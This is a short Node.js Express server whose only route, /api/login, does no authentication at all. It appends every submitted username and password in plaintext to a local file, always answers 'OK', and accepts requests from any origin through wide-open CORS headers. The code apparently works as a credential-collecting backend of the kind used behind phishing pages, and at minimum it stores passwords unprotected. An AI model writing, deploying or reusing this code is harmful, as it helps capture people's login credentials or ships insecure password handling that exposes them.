var express = require('express');
const bodyParser = require('body-parser');
var fs = require('fs');

var app = express();

app.use(bodyParser.json());

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  next();
});

app.post('/api/login', function (req, res) {
  fs.appendFile('data.txt', `${req.body.username}\n${req.body.password}\n`, function (err) {
    if (err) throw err;
    console.log('Saved!');
  }); 
  res.status(200).send('OK');
});

app.listen(3001, function () {
  console.log('Example app listening on port 3001!');
});